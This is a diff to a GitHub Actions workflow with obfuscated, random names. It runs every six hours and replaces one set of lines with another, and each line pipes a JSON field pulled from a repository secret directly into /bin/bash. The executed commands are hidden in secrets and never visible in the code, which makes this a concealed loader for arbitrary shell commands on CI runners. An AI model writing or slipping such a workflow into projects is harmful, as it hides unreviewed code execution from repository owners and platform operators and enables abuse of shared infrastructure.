@@ -3,28 +3,17 @@ name: xamiioyj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
-
+    - cron: '52 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xamiioyj
         env:
-          et9: ${{ secrets.et9 }}
+          qbbed7: ${{ secrets.qbbed7 }}
         run: |
-          echo $et9 | jq -r .ipf616 | /bin/bash
-          echo $mrr1 | jq -r .eekry026 | /bin/bash
-          echo $f62 | jq -r .toe47638 | /bin/bash
-          echo $lnhb59500 | jq -r .eaum1324 | /bin/bash
-          echo $jeui6676 | jq -r .kjt98 | /bin/bash
-          echo $m2 | jq -r .coco6512 | /bin/bash
-          echo $wiaiz41969 | jq -r .goxz65422 | /bin/bash
-          echo $oi82 | jq -r .tf1 | /bin/bash
-          echo $iyc96658 | jq -r .x53 | /bin/bash
-          echo $zwm27092 | jq -r .bjaji2 | /bin/bash
-          echo $l881 | jq -r .np7 | /bin/bash
-          echo $ggpva274 | jq -r .fml599 | /bin/bash
-          echo $c83553 | jq -r .ne27 | /bin/bash
+          echo $qbbed7 | jq -r .wfgsd11 | /bin/bash
+          echo $mtkf6 | jq -r .vg12946 | /bin/bash
 
